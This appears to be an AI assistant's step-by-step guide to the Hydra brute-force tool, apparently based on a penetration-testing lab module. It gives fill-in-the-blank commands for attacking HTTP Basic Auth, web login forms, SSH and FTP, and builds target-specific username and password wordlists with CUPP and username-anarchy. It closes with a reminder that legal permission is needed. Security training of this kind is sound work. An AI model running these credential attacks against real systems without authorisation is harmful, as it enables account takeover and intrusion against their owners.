I'll give you a **simple step‑by‑step guide** that shows exactly **where to put your target information** (IP, port, username, password list, etc.) in each command.  
You don’t need any prior knowledge – just copy the commands and replace the parts marked in `< >` with your own details.

---

## 1. Basic structure of a Hydra command

Most Hydra commands follow this pattern:

```bash
hydra [options] service://<target_ip>:<port>
```

- **`<target_ip>`** = the IP address of the machine you are attacking.
- **`<port>`** = the port number the service is running on (e.g., 80 for HTTP, 22 for SSH, 21 for FTP).
- **`service`** = the protocol (e.g., `http-get`, `http-post-form`, `ssh`, `ftp`).

The options tell Hydra which usernames and passwords to try.

---

## 2. How to get your target’s IP and port

If you are in a lab or a CTF, you will usually be given an IP address and a port number.  
For example, in the module they used `178.35.49.134` and ports like `32901` or `31099`.  
Replace those with your own target IP and port.

---

## 3. Step-by-step commands with placeholders

### Step 1: Hydra help (no target needed)
```bash
hydra -h
```
This just shows help. No target info needed.

---

### Step 2: Brute‑force HTTP Basic Auth with a combined wordlist (default credentials)

**Command:**
```bash
hydra -C /path/to/combined_wordlist.txt <target_ip> -s <port> http-get /
```
**What to replace:**
- `/path/to/combined_wordlist.txt` – use the path to a file that contains `username:password` pairs. The module uses `/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`.
- `<target_ip>` – your target IP.
- `<port>` – the port number (e.g., 31099).

**Example with actual values:**
```bash
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
```

**What to look for:** Hydra will show a line like `[http-get] host: ... login: test password: testingpw` when it finds a working pair.

---

### Step 3: Brute‑force HTTP Basic Auth with separate username and password wordlists

**Command:**
```bash
hydra -L /path/to/usernames.txt -P /path/to/passwords.txt -u -f <target_ip> -s <port> http-get /
```
**What to replace:**
- `/path/to/usernames.txt` – your username wordlist (e.g., `/opt/useful/SecLists/Usernames/Names/names.txt`).
- `/path/to/passwords.txt` – your password wordlist (e.g., `/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt`).
- `<target_ip>` – your target IP.
- `<port>` – the port.

**Example:**
```bash
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
```

---

### Step 4: Brute‑force a login form (POST) – with a fixed username

**Command:**
```bash
hydra -l <username> -P /path/to/passwords.txt -f <target_ip> -s <port> http-post-form "/login.php:username=^USER^&password=^PASS^:F=<fail_string>"
```
**What to replace:**
- `<username>` – the username you want to test (e.g., `admin`).
- `/path/to/passwords.txt` – your password wordlist.
- `<target_ip>` – target IP.
- `<port>` – port number.
- `/login.php` – the URL path of the login page (it could be `/login.php`, `/admin/login`, etc. – you must find it).
- `username` and `password` – these are the field names from the login form. Replace them with the actual names (commonly `username`, `user`, `email`, etc.).
- `<fail_string>` – a piece of text that appears **only when login fails**. Usually found by viewing the page source (e.g., `<form name='login'`).

**How to find the login page and field names:**
1. Open the login page in your browser.
2. Press `Ctrl+Shift+E` (Firefox) or `F12` to open developer tools → Network tab.
3. Try to log in with any dummy credentials (e.g., `test:test`).
4. In the Network tab, click on the request that was sent to the server (usually named `login.php` or similar).
5. Look at the **Request** section; you will see the POST data like `username=test&password=test`. That tells you the field names.
6. The **URL path** is shown at the top (e.g., `/login.php`).
7. For the fail string, go to the **Response** tab or view the page source (`Ctrl+U`) and find a unique string that only appears on the login page (like a button text, a form name, or an error message). In the module they used `<form name='login'`.

**Example command:**
```bash
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

---

### Step 5: Brute‑force SSH with your own wordlists

**Command:**
```bash
hydra -L /path/to/usernames.txt -P /path/to/passwords.txt -u -f ssh://<target_ip>:<port> -t 4
```
**What to replace:**
- `/path/to/usernames.txt` – your username wordlist.
- `/path/to/passwords.txt` – your password wordlist.
- `<target_ip>` – target IP.
- `<port>` – SSH port (usually 22).

**Example:**
```bash
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
```

---

### Step 6: Brute‑force FTP with a fixed username

**Command:**
```bash
hydra -l <username> -P /path/to/passwords.txt ftp://<target_ip>:<port>
```
**What to replace:**
- `<username>` – the username you want to test.
- `/path/to/passwords.txt` – your password wordlist.
- `<target_ip>` – target IP.
- `<port>` – FTP port (usually 21).

**Example:**
```bash
hydra -l m.gates -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-10.txt ftp://127.0.0.1
```

---

## 4. Creating your own wordlists

### Using CUPP to make a custom password wordlist
```bash
cupp -i
```
You will be asked questions about the target (first name, last name, birthdate, etc.). Answer them.  
**Where to put your info:** Just type the information when prompted. The output file will be named after the first name (e.g., `william.txt`).

### Using username‑anarchy to generate username variants
```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
./username-anarchy <First Name> <Last Name> > usernames.txt
```
Replace `<First Name>` and `<Last Name>` with the target’s name.  
**Example:** `./username-anarchy Bill Gates > bill.txt`

### Filtering a wordlist for password policies
If you know the password policy (e.g., must be at least 8 chars, contain a special char and a number), use these commands on your wordlist file:

```bash
sed -ri '/^.{,7}$/d' your_wordlist.txt      # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' your_wordlist.txt   # keep only those with a special char
sed -ri '/[0-9]+/!d' your_wordlist.txt       # keep only those with a number
```
Replace `your_wordlist.txt` with the actual filename.

---

## 5. After finding credentials

### SSH into the server
```bash
ssh <username>@<target_ip> -p <port>
```
Example: `ssh b.gates@178.35.49.134 -p 22`

### FTP to the server
```bash
ftp <target_ip> <port>   # if port is non‑standard, use ftp -p <port> or just ftp <target_ip> and enter the port when asked
```
Example: `ftp 127.0.0.1`

### Switch to another user (once you have a shell)
```bash
su - <username>
```
Example: `su - m.gates`

---

## Summary – Where to put your own info

| Command part          | What to replace it with                          | Example                                           |
|-----------------------|--------------------------------------------------|---------------------------------------------------|
| `<target_ip>`         | IP address of the target                         | `178.35.49.134`                                   |
| `<port>`              | Port number                                      | `32901`                                           |
| `/path/to/wordlist`   | Path to your wordlist file                       | `/opt/useful/SecLists/Passwords/rockyou.txt`      |
| `<username>`          | A single username (like admin)                   | `admin`                                           |
| `<username_field>`    | The name of the username field in the form       | `username`                                        |
| `<password_field>`    | The name of the password field in the form       | `password`                                        |
| `<fail_string>`       | Unique text that appears only on failed login    | `<form name='login'`                              |
| `/login.php`          | The URL path to the login page                   | `/login.php`                                      |
| `<First Name>`        | First name of the target (for username‑anarchy)  | `Bill`                                            |
| `<Last Name>`         | Last name of the target                          | `Gates`                                           |

If you are ever unsure, run `hydra -h` or `hydra <module> -U` (e.g., `hydra http-post-form -U`) to see detailed syntax.

**Important:** Always ensure you have legal permission to test the target before running any brute‑force attack.
